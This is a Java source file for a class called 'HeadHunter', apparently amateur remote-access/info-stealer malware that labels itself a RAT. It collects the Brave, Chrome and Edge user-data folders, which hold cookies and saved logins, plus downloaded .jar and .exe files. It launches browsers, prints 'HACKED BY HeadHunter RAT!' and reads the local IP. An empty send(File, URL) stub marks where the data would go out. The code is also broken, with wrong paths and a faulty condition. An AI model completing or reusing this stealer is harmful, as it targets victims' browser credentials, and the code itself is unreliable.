import java.io.File;
import java.io.IOException;
import java.net.InetAddress;
import java.net.URL;
import java.net.UnknownHostException;
import java.util.ArrayList;

public class HeadHunter {
    File file;

    public File getFile() {
        return file;
    }

    void execute() {
        ArrayList<File> files = new ArrayList<File>();
        File brave_data = new File(System.getenv("LOCALAPPDATA") + "/BraveSoftware/Brave-Browser/User Data");
        File chrome_data = new File(System.getenv("LOCALAPPDATA") + "/Google/Chrome/user Data");
        File edge_data = new File(System.getenv("LOCALAPPDATA") + "/Microsoft/Edge/User Data");
        File jarfile = new File(System.getenv("DOWNLOADS") + "" + ".jar");
        File exefile = new File(System.getenv("DOWNLOADS") + "" + ".exe");
        if (brave_data.isDirectory()) {
            files.add(brave_data); // this can affect me, cause i use Brave as my main browser
        } else {
            System.out.println("Mission Failed!");
        }
        if (chrome_data.isDirectory()) {
            files.add(chrome_data); // gets chrome user data folder
        } else {
            System.out.println("Mission Failed!");
        }
        if (edge_data.isDirectory()) {
            files.add(edge_data); // gets edge user data folder

        } else {
            System.out.println("Mission Failed!");
        }
        if (jarfile.isFile()) {
            files.add(jarfile); // gets jar files
        } else {
            System.out.println("Mission Failed!");
        }
        if (exefile.isFile()) {
            files.add(exefile); // gets exe files
        } else {
            System.out.println("Mission Failed!");
        }
        if (files.add(brave_data) ||
                files.add(chrome_data) || files.add(edge_data)
                || files.add(jarfile) || files.add(exefile)) {
            try {
                Runtime.getRuntime().exec("Chrome.exe");
                Runtime.getRuntime().exec("Brave Browser.exe");
                Runtime.getRuntime().exec("cmd.exe /c echo HACKED BY HeadHunter RAT!");
            } catch (IOException e) {
                e.printStackTrace();
            }
            try {
                InetAddress.getLocalHost().getHostAddress();
            } catch (UnknownHostException e) {
                e.printStackTrace();
            }
        }

    }

    public void send(File file, URL url) {
    }

}